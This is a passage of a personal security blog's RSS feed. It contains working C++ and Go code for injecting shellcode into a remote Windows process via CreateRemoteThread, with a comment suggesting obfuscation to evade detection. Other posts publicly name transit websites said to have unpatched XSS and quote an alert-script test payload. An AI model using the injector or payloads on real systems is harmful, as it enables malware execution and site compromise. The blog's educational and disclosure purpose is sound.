</span><span style="color:#999;font-style:italic"></span>	hThread = CreateRemoteThread(hProc, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, (LPTHREAD_START_ROUTINE)lpStartAddress, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, <span style="color:#24909d">NULL</span>);
	<span style="color:#6ab825;font-weight:bold">if</span> (hThread == <span style="color:#24909d">NULL</span>) {
		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">5</span>;
	}

	<span style="color:#999;font-style:italic">//Close the open handles
</span><span style="color:#999;font-style:italic"></span>	CloseHandle(hProc);

	<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
}
</code></pre></div><p>And now the exact same thing, but in Go:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#6ab825;font-weight:bold">import</span> (
	<span style="color:#ed9d13">&#34;syscall&#34;</span>
	<span style="color:#ed9d13">&#34;unsafe&#34;</span>
	<span style="color:#ed9d13">&#34;golang.org/x/sys/windows&#34;</span>
)

<span style="color:#6ab825;font-weight:bold">var</span> (
	<span style="color:#999;font-style:italic">//DLLs
</span><span style="color:#999;font-style:italic"></span>	kernel32 = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;kernel32.dll&#34;</span>)
	user32   = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;user32.dll&#34;</span>)
	ntdll    = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;ntdll.dll&#34;</span>)
)

<span style="color:#6ab825;font-weight:bold">const</span> (
	PAGE_EXECUTE_READWRITE = <span style="color:#3677a9">0x40</span>
	PAGE_EXECUTE_READ      = <span style="color:#3677a9">0x20</span>
	PROCESS_ALL_ACCESS     = <span style="color:#3677a9">0x1F0FFF</span>
)

<span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">Inj_CreateRemoteThread</span>(pid <span style="color:#6ab825;font-weight:bold">int</span>, shellcode []<span style="color:#6ab825;font-weight:bold">byte</span>) (err <span style="color:#6ab825;font-weight:bold">error</span>) {
	<span style="color:#999;font-style:italic">//You might want to encrypt references, these may look vErY SuSpIcIouS ;)
</span><span style="color:#999;font-style:italic"></span>	virtualAllocEx := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;VirtualAllocEx&#34;</span>)
	openProcess := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;OpenProcess&#34;</span>)
	virtualProtectEx := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;VirtualProtectEx&#34;</span>)
	writeProcessMemory := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;WriteProcessMemory&#34;</span>)
	createRemoteThread := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;CreateRemoteThread&#34;</span>)
	closeHandle := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;CloseHandle&#34;</span>)

	memProtect := windows.PAGE_READWRITE

	<span style="color:#999;font-style:italic">//Get a handle from the given pid
</span><span style="color:#999;font-style:italic"></span>	handle, _, err := openProcess.<span style="color:#447fcf">Call</span>(PROCESS_ALL_ACCESS, <span style="color:#3677a9">0</span>, <span style="color:#24909d">uintptr</span>(pid))
	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
		<span style="color:#6ab825;font-weight:bold">return</span> err
	}

	<span style="color:#999;font-style:italic">//Allocate some space into the remote process, big enough to host our shellcode.
</span><span style="color:#999;font-style:italic"></span>	lpStartAddress, _, err := virtualAllocEx.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), <span style="color:#3677a9">0</span>, <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
		<span style="color:#6ab825;font-weight:bold">return</span> err
	}

	<span style="color:#999;font-style:italic">//Write our shellcode to the allocated memory on the remote process
</span><span style="color:#999;font-style:italic"></span>	_, _, err = writeProcessMemory.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), lpStartAddress, (<span style="color:#6ab825;font-weight:bold">uintptr</span>)(unsafe.<span style="color:#447fcf">Pointer</span>(&amp;shellcode[<span style="color:#3677a9">0</span>])), <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), <span style="color:#3677a9">0</span>)
	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
		<span style="color:#6ab825;font-weight:bold">return</span> err
	}

	<span style="color:#999;font-style:italic">//Change the memory to be executable
</span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//WARN: this is unneeded if we change VirtualAllocEx to set the memory as PAGE_EXECUTE_READWRITE
</span><span style="color:#999;font-style:italic"></span>	_, _, err = virtualProtectEx.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), lpStartAddress, <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), windows.PAGE_EXECUTE_READ, <span style="color:#24909d">uintptr</span>(unsafe.<span style="color:#447fcf">Pointer</span>(&amp;memProtect)))
	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
		<span style="color:#6ab825;font-weight:bold">return</span> err
	}

	<span style="color:#999;font-style:italic">//Create &amp; run a remote thread which points to the start of the memory holding the shellcode
</span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//we are discarding the handle to the thread, this might not be what you want in a real scenario.
</span><span style="color:#999;font-style:italic"></span>	_, _, err = createRemoteThread.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, lpStartAddress, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>)
	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
		<span style="color:#6ab825;font-weight:bold">return</span> err
	}

	<span style="color:#999;font-style:italic">//Close the process handle
</span><span style="color:#999;font-style:italic"></span>	_, _, err = closeHandle.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle))
	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
		<span style="color:#6ab825;font-weight:bold">return</span> err
	}

	<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">nil</span>
}
</code></pre></div><p>As you see, the process is almost the same, mostly thanks to the <strong>golang.org/x/sys/windows</strong>  package. Now, in a real-world scenario just plain injecting the shellcode may not be as easy, as the injector is still highly easy to spot (common API pattern, cleartext references, etc).</p>
<p>Anyhow, Windows makes it generally pretty straight forward to perform operations on remote processes, no wonder userspace malwares are so popular! They are easy to implement, quick to develop and if they get caught, well&hellip; just make a new one.</p>
<p>I do plan on eventually sharing other snippets for stuff I find interesting, Windows-related&hellip; this is if I don&rsquo;t get slapped to numbness with a printed version of MSDN by my friend that has been trying to get me to learn all this shit.</p>
<p>Over and out.</p>
<hr>
<p><strong>Update:</strong></p>
<p>As I was testing (and correcting) the C++ code I noticed there was a useless step in the function: I was allocating an area as Read-Write and only later modifying it to be executable.
This was indeed unneeded.</p>
<p>While it worked, one can totally skip the <strong>VirtualProtectEx</strong> in the Go version, and just do as the updated C++ code: calling <strong>VirtualAllocEx</strong> with <code>PAGE_EXECUTE_READ_WRITE</code>.</p>
<p>I&rsquo;ll leave the Go version as a reference for stupid code and use this as an excuse to avoid modifying it because I really want to watch another episode of Battlestar Galactica, instead of removing a few lines of code. I&rsquo;m lazy, fight me&hellip;or don&rsquo;t, it&rsquo;s less tiring.</p>
]]></content>
        </item>
        
        <item>
            <title>Go(ogle) Play Books</title>
            <link>/posts/2021/04/google-play-books/</link>
            <pubDate>Fri, 09 Apr 2021 21:35:36 +0200</pubDate>
            
            <guid>/posts/2021/04/google-play-books/</guid>
            <description>The title is kind of a very bad pun, one of the &amp;ldquo;that&amp;rsquo;s not even funny&amp;rdquo; ones. So, what is today&amp;rsquo;s post about? Google.
No, not the privacy concerns or the data usage policies, nor their silly Google Play Store rules. Not the tracking, not the fact that their products seem to be walking dead bodies before they reach their prime time (looking at you Stadia)&amp;hellip; but books.
I recently decided to download back all the e-books which I so carefully uploaded over the year to their Books service back&amp;hellip;</description>
            <content type="html"><![CDATA[<p>The title is kind of a very bad pun, one of the &ldquo;that&rsquo;s not even funny&rdquo; ones. So, what is today&rsquo;s post about? Google.</p>
<p>No, not the privacy concerns or the data usage policies, nor their silly Google Play Store rules. Not the tracking, not the fact that their products seem to be walking dead bodies before they reach their prime time (looking at you Stadia)&hellip; but books.</p>
<p>I recently decided to download back all the e-books which I so carefully uploaded over the year to their Books service back&hellip;</p>
<p>I thought it would take me half a second (more like a bunch of hours, considering the near dial-up internet connection I have recently), but: nope! Apparently my assumptions about a big blue button saying &ldquo;Download all&rdquo;, right there, in plain sight for the user to press were wrong.</p>
<p>Now, chances are I could be VERY blind and have totally missed it, but that hasn&rsquo;t stopped me from <del>finding a lame excuse to code in Go</del> finding a way around the problem.</p>
<p>So, since I was only able to download <strong>one-book-at-the-time</strong>, which I guess is fine for say&hellip; 1 to 5 books, it looked quite a chore to do it 130+ times.</p>
<p>Took me around 20 minutes to hack this thing together. Now&hellip; I know the code is ugly, I know it&rsquo;s messy, I know I could have tried just a little bit harder to use selenium instead of <strong>saving the rendered page from the browser</strong> and parsing it&hellip; but I just wanted my books back! D:</p>
<p>So without any further ado&hellip; here it goes, in all its gorgeous monstrosity, <strong>GoGetMyBooks</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#6ab825;font-weight:bold">package</span> main

<span style="color:#6ab825;font-weight:bold">import</span> (
        <span style="color:#ed9d13">&#34;fmt&#34;</span>
        <span style="color:#ed9d13">&#34;io&#34;</span>
        <span style="color:#ed9d13">&#34;mime&#34;</span>
        <span style="color:#ed9d13">&#34;net/http&#34;</span>
        <span style="color:#ed9d13">&#34;net/url&#34;</span>
        <span style="color:#ed9d13">&#34;os&#34;</span>
        <span style="color:#ed9d13">&#34;strings&#34;</span>
        <span style="color:#ed9d13">&#34;sync&#34;</span>

        <span style="color:#ed9d13">&#34;github.com/antchfx/htmlquery&#34;</span>
)

<span style="color:#6ab825;font-weight:bold">type</span> Book <span style="color:#6ab825;font-weight:bold">struct</span> {
        Title <span style="color:#6ab825;font-weight:bold">string</span>
        URL   <span style="color:#6ab825;font-weight:bold">string</span>
        ID    <span style="color:#6ab825;font-weight:bold">string</span>
}

<span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">main</span>() {
        fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;&gt; GoGetMyBooks v.0.1 - by thatsn0tmysite (a.k.a. n0tme)&#34;</span>)
         
        cookies := <span style="color:#ed9d13">&#34;&#34;</span> <span style="color:#999;font-style:italic">// Too lazy to use the flag package, or sys.argv, or anything really...
</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">if</span> cookies == <span style="color:#ed9d13">&#34;&#34;</span> {
                <span style="color:#24909d">panic</span>(<span style="color:#ed9d13">&#34;Error: variable cookies has no value... copy it from your browser requests&#34;</span>)
        }
        c := &amp;http.Client{}

        <span style="color:#999;font-style:italic">// Read Google Play.html
</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">var</span> books []Book
        booksHTML, err := htmlquery.<span style="color:#447fcf">LoadDoc</span>(<span style="color:#ed9d13">&#34;Google Play.html&#34;</span>)
        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
                <span style="color:#24909d">panic</span>(<span style="color:#ed9d13">&#34;Error: save the Google Play Books page with firefox/chrome&#34;</span>)
        }
        nodes, err := htmlquery.<span style="color:#447fcf">QueryAll</span>(booksHTML, <span style="color:#ed9d13">&#34;//a[contains(@class, &#39;overlay&#39;)]&#34;</span>)
        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
                <span style="color:#24909d">panic</span>(<span style="color:#ed9d13">&#34;Error: not a valid XPath expression&#34;</span>)
        }

        <span style="color:#999;font-style:italic">// yes, we iterate here...
</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">for</span> _, node := <span style="color:#6ab825;font-weight:bold">range</span> nodes {
                book := Book{Title: htmlquery.<span style="color:#447fcf">SelectAttr</span>(node, <span style="color:#ed9d13">&#34;title&#34;</span>), URL: htmlquery.<span style="color:#447fcf">SelectAttr</span>(node, <span style="color:#ed9d13">&#34;href&#34;</span>)}
                u, _ := url.<span style="color:#447fcf">Parse</span>(book.URL) <span style="color:#999;font-style:italic">// blindly assume this won&#39;t fail
</span><span style="color:#999;font-style:italic"></span>                book.ID = strings.<span style="color:#447fcf">Split</span>(u.RawQuery, <span style="color:#ed9d13">&#34;=&#34;</span>)[<span style="color:#3677a9">1</span>]
                books = <span style="color:#24909d">append</span>(books, book)
        }
        fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Found &#34;</span>, <span style="color:#24909d">len</span>(books), <span style="color:#ed9d13">&#34; books...&#34;</span>)

        <span style="color:#999;font-style:italic">// ...and here, useless, but whatever...
</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">var</span> wg sync.WaitGroup
        <span style="color:#6ab825;font-weight:bold">for</span> _, book := <span style="color:#6ab825;font-weight:bold">range</span> books {
                wg.<span style="color:#447fcf">Add</span>(<span style="color:#3677a9">1</span>)

                <span style="color:#999;font-style:italic">//GOGOGO!
</span><span style="color:#999;font-style:italic"></span>                <span style="color:#6ab825;font-weight:bold">go</span> <span style="color:#6ab825;font-weight:bold">func</span>(book Book) {
                        <span style="color:#6ab825;font-weight:bold">defer</span> wg.<span style="color:#447fcf">Done</span>()
                        fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Processing: &#34;</span>, book.Title)

                        <span style="color:#999;font-style:italic">//filename was unnecessary, so i am using iwantmyfileback
</span><span style="color:#999;font-style:italic"></span>                        downloadURL := fmt.<span style="color:#447fcf">Sprintf</span>(<span style="color:#ed9d13">&#34;https://books.google.com/books/download/iwantmyfileback?id=%v&amp;output=uploaded_content&amp;source=gbs_api&amp;authuser=0&#34;</span>, book.ID)
                        req, err := http.<span style="color:#447fcf">NewRequest</span>(<span style="color:#ed9d13">&#34;GET&#34;</span>, downloadURL, <span style="color:#6ab825;font-weight:bold">nil</span>)
                        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
                                fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;httpClientError: &#34;</span>, err)
                        }

                        <span style="color:#999;font-style:italic">//Set request headers for authentication (not using req.SetCookie because... lazyness)
</span><span style="color:#999;font-style:italic"></span>                        req.Header.<span style="color:#447fcf">Set</span>(<span style="color:#ed9d13">&#34;Cookie&#34;</span>, cookies)

                        <span style="color:#999;font-style:italic">// Get the file data
</span><span style="color:#999;font-style:italic"></span>                        resp, err := c.<span style="color:#447fcf">Do</span>(req)
                        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
                                fmt.<span style="color:#447fcf">Print</span>(<span style="color:#ed9d13">&#34;httpClientDoError: &#34;</span>, err)
                        }
                        <span style="color:#6ab825;font-weight:bold">defer</span> resp.Body.<span style="color:#447fcf">Close</span>()

                        <span style="color:#999;font-style:italic">// Get a filename
</span><span style="color:#999;font-style:italic"></span>                        _, params, err := mime.<span style="color:#447fcf">ParseMediaType</span>(resp.Header.<span style="color:#447fcf">Get</span>(<span style="color:#ed9d13">&#34;Content-Disposition&#34;</span>))
                        filename := <span style="color:#24909d">string</span>(params[<span style="color:#ed9d13">&#34;filename&#34;</span>])
                        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
                                <span style="color:#999;font-style:italic">//fmt.Println(&#34;mimeTypeError: &#34;, err)
</span><span style="color:#999;font-style:italic"></span>                                <span style="color:#999;font-style:italic">// for some reason some files throw a mime: invalid media parameter error,
</span><span style="color:#999;font-style:italic"></span>                                <span style="color:#999;font-style:italic">// lets try to handle this quietly forcing a name to the file
</span><span style="color:#999;font-style:italic"></span>                                <span style="color:#999;font-style:italic">// seems to do it on some epub files where it fails to parse the title correctly(?)
</span><span style="color:#999;font-style:italic"></span>                                <span style="color:#999;font-style:italic">// should we always assume it&#39;s an epub?
</span><span style="color:#999;font-style:italic"></span>                                x := strings.<span style="color:#447fcf">Split</span>(book.Title, <span style="color:#ed9d13">&#34;.&#34;</span>)
                                ext := x[<span style="color:#24909d">len</span>(x)-<span style="color:#3677a9">1</span>]

                                <span style="color:#6ab825;font-weight:bold">if</span> ext == <span style="color:#ed9d13">&#34;&#34;</span> {
                                        filename = fmt.<span style="color:#447fcf">Sprintf</span>(<span style="color:#ed9d13">&#34;%v.%v&#34;</span>, book.Title, <span style="color:#ed9d13">&#34;UNKNOWN_EXTENTION&#34;</span>)
                                } <span style="color:#6ab825;font-weight:bold">else</span> {
                                        filename = book.Title
                                }
                        }

                        <span style="color:#999;font-style:italic">// Create empty file
</span><span style="color:#999;font-style:italic"></span>                        out, err := os.<span style="color:#447fcf">Create</span>(filename)
                        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
                                fmt.<span style="color:#447fcf">Print</span>(<span style="color:#ed9d13">&#34;osCreateError(&#34;</span>, filename, <span style="color:#ed9d13">&#34;): &#34;</span>, err)
                        }
                        <span style="color:#6ab825;font-weight:bold">defer</span> out.<span style="color:#447fcf">Close</span>()

                        <span style="color:#999;font-style:italic">// Save to file
</span><span style="color:#999;font-style:italic"></span>                        written, err := io.<span style="color:#447fcf">Copy</span>(out, resp.Body)
                        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
                                fmt.<span style="color:#447fcf">Print</span>(<span style="color:#ed9d13">&#34;ioCopyError: &#34;</span>, err)
                        }
                        fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Saved file: &#34;</span>, filename, <span style="color:#ed9d13">&#34; (&#34;</span>, written, <span style="color:#ed9d13">&#34; bytes)&#34;</span>)

                }(book)
        }
        wg.<span style="color:#447fcf">Wait</span>()
}

</code></pre></div><p>The usage is quite simple:</p>
<ol>
<li>login to Google Play Books</li>
</ol>
<ul>
<li>copy the Cookie header value from the authenticated requests into the variable <code>cookies</code></li>
<li>click on the &ldquo;show all&rdquo; button on the Play Books page to list all the books</li>
<li>ctrl-s / save the page from your browser into <strong>GoGetMyBooks</strong>' working directory (be sure to name it <code>Google Play.html</code>)</li>
<li>run <strong>GoGetMyBooks</strong></li>
</ul>
<p>As some of the comments in the code suggest, there are a few issues like the fact that some books' titles get lost (so it falls back to the uploaded filename).</p>
<p>So to sum it all up, fuck Javascript &amp;&amp; enjoy my shitty code :).</p>
<p>See ya next time.</p>
]]></content>
        </item>
        
        <item>
            <title>Public disclosures</title>
            <link>/posts/2021/03/public-disclosures/</link>
            <pubDate>Tue, 16 Mar 2021 22:37:40 +0100</pubDate>
            
            <guid>/posts/2021/03/public-disclosures/</guid>
            <description>Well, as mentioned in the last post, some lame XSS I found just went public.
For those wanting to jump straight to the point:
 muoversiaroma.it romamobile.it travel.mob.cotralspa.it servizi.cotralspa.it  I am a firm believer in the philosophy of &amp;ldquo;disclose as you please&amp;rdquo;, for the vulnerabilities above, I decided to attempt and be as ethical as possible and tried to disclose them responsibly.
That attempt failed.
Apparently what a researcher thinks is going to happen and what actually happens not always matches.</description>
            <content type="html"><![CDATA[<p>Well, as mentioned in the last <a href="/posts/2021/03/first-commit/">post</a>, some lame XSS I found just went public.</p>
<p>For those wanting to jump straight to the point:</p>
<ul>
<li><a href="https://www.openbugbounty.org/reports/1610312/">muoversiaroma.it</a></li>
<li><a href="https://www.openbugbounty.org/reports/1610327/">romamobile.it</a></li>
<li><a href="https://www.openbugbounty.org/reports/1610334/">travel.mob.cotralspa.it</a></li>
<li><a href="https://www.openbugbounty.org/reports/1610344/">servizi.cotralspa.it</a></li>
</ul>
<p>I am a firm believer in the philosophy of &ldquo;disclose as you please&rdquo;, for the vulnerabilities above, I decided to attempt and be as ethical as possible and tried to disclose them responsibly.</p>
<p>That attempt failed.</p>
<p>Apparently what a researcher thinks is going to happen and what actually happens not always matches. Actually, almost never does in my experience.</p>
<p>I used <a href="https://www.openbugbounty.org">openbugbounty</a> because, in all honestly, I  have no desire in time juggling myself through finding security contacts, emailing and explaining things, so if I can just break things, and have the rest happen auto-magically, so be it&hellip; or to put it differently, I&rsquo;m a lazy bum and I just don&rsquo;t give a flying fu*k (hell, it&rsquo;s my blog, why do I censure myself, fuck, I meant <strong>FUCK</strong> - sorry kids).</p>
<p>Well long story short: those vulnerabilities are still unpatched to this day and I am kind of bored, so&hellip; blogpost.</p>
<p>If anyone from <a href="https://twitter.com/InfoAtac">@InfoAtac</a>, <a href="https://twitter.com/BusCotral">@BusCotral</a> or <a href="https://twitter.com/romamobilita">@romamobilita</a> happens to read this blog post, maybe, just maybe, fix them? I&rsquo;m sure your users would appreciate it.
Also, consider using a <a href="https://securitytxt.org/">security.txt</a>, or making it easier to find security contacts.</p>
<p>By the way, public disclosures are a free as in beer service, however, rewards are still appreciated :).</p>
<p>Until next time,
pop alerts.</p>
]]></content>
        </item>
        
        <item>
            <title>First commit</title>
            <link>/posts/2021/03/first-commit/</link>
            <pubDate>Wed, 10 Mar 2021 02:18:22 +0100</pubDate>
            
            <guid>/posts/2021/03/first-commit/</guid>
            <description>For the few souls that ever followed my blog: I finally migrated. There was no real reason to keep a wordpress blog, as I really never used any features from Wordpress.
I migrated to Github pages, because&amp;hellip; free hosting, and custom domains. Seemed nice enough to me, also for some reason I ended up using Hugo, over Jekyll. I could never get Jekyll to run even thought the setup is actually almsot the same as Hugo&amp;rsquo;s.</description>
            <content type="html"><![CDATA[<p>For the few souls that ever followed my blog: I finally migrated.
There was no real reason to keep a <a href="https://thatsn0tmysite.wordpress.com">wordpress blog</a>, as I really never used any features from Wordpress.</p>
<p>I migrated to Github pages, because&hellip; free hosting, and custom domains. Seemed nice enough to me, also for some reason I ended up using Hugo, over Jekyll. I could never get Jekyll to run even thought the setup is actually almsot the same as Hugo&rsquo;s.</p>
<p>Truth is, deep inside my brain there is a gopher lurking.</p>
<p>Well, this was only a first post, I do not really have anything else to share. As always I end up writing once or less a year.</p>
<p>Hopefully having migrated to github pages will push me to write more.</p>
<p>Before fading to radio silence again, I will leave you with a question that has been hunting me lately.
Do people really read reports from <a href="https://openbugbounty.org/">openbugbounty</a>, I reported several XSS issues since December, and they haven&rsquo;t been fixed yet, nothing exciting, just the usual suspect: <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>.</p>
<p>In a few days the reports are going to be disclosed&hellip;</p>
<p>Until then, cheers!</p>
]]></content>
        </item>
        
    </channel>
</rss>
